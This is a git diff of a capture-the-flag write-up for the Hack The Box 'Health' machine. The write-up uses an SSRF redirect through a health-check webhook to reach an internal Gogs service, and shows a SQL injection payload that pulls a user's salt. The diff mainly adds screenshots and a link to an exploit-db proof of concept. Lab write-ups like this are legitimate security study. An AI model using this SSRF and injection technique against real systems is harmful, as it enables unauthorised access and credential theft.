@@ -35,6 +35,11 @@ Nmap done: 1 IP address (1 host up) scanned in 43.07 seconds
 
 The webpage is a health check site for checking any webpage. I tried a few things but the way to go was to access the port 3000 site that was running off their local host. Trying to check their localhost:3000 returns an error that it is not allowed.
 
+
+![image](https://user-images.githubusercontent.com/105310322/194422971-3e1a3fe7-ae24-4551-a31e-ccecc0f3e0e6.png)
+
+
+
 So to get around this problem we need to redirect to the url through health.htb. The link below is for a simple python script to redirect.
 
 ```https://gist.github.com/shreddd/b7991ab491384e3c3331```
@@ -222,16 +227,13 @@ After formatting it we get an html that looks much nicer.
 </html>
 ```
 
-Now if we drag and drop the html file into our browser we can access the static page.
+Now if we drag and drop the html file into our browser we can access the static page which is a gogs webpage.
 
 
+![image](https://user-images.githubusercontent.com/105310322/194423032-053f5637-9867-4d25-9e2c-6569643c4d6a.png)
 
 
-
-
-
-
-
+There is a nice PoC exploit for this that will speed this next part up.
 
 https://www.exploit-db.com/exploits/35238
 
@@ -293,7 +295,7 @@ Content-Length: 754
 {"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"http:\/\/10.10.16.19","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 301 Moved Permanently","headers":{"Server":"SimpleHTTP\/0.6 Python\/2.7.18","Date":"Wed, 05 Oct 2022 21:06:48 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/salt\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"174"}}
 ```
 
-For this hash cracking portion help was needed and appreciated
+### For this hash cracking portion help was needed and appreciated!
 
 Now in order to actually decrypt this hash we have to convert back into hex and then base64.
 
